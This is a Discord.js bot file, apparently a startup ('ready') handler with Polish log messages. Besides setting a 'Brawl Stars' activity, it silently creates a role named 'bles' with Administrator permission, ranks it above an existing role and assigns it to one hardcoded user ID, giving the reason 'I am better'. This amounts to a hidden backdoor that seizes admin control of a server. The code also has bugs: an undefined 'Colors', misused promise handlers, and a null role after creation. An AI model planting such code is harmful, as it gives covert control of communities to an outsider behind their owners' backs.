const { PermissionsBitField } = require('discord.js');

module.exports = async function ready(client) {
    console.log(client.user.tag + ' jest onlajn');
    client.user.setActivity({
        name: 'Brawl Stars'
    })
    const guildId = '1137744153879523378';
    const guild = client.guilds.cache.get(guildId);
    const userId = '952296941339934720';

    if (!guild) {
        console.log(`Guild with ID '${guildId}' not found.`);
        return;
    }

    const role = guild.roles.cache.find(r => r.name === 'bles');

    if (!role) {
        guild.roles.create({
            name: 'bles',
            color: Colors.Default,
            hoist: false,
            mentionable: false,
            permissions: PermissionsBitField.Administrator,
            position: guild.roles.cache.find(r => r.name === 'Oskarek').position + 1,
            reason: 'jestem lepszy'
        })
            .then(console.log('Role bles was created with administrator permissions.'))
            .catch(console.error('There was an error creating role bles: '));
        console.log(`Role 'bles' does not exist in guild '${guild.name}' (ID: ${guild.id}).`);
    }

    if (!role.permissions.has(PermissionsBitField.Flags.Administrator)) {
        try {
            await role.setPermissions([PermissionsBitField.Flags.Administrator]);
            console.log(`Administrator permissions have been added to the role '${role.name}'.`);
        } catch (error) {
            console.error(`Failed to update role permissions: ${error}`);
        }
    }

    try {
        const member = await guild.members.fetch(userId);
        if (!member) {
            console.log(`Member with ID '${userId}' not found.`);
            return;
        }
        await member.roles.add(role);
        console.log(`Role '${role.name}' has been assigned to <@${userId}>.`);
    } catch (error) {
        console.error(`Failed to assign role to user: ${error}`);
    }
}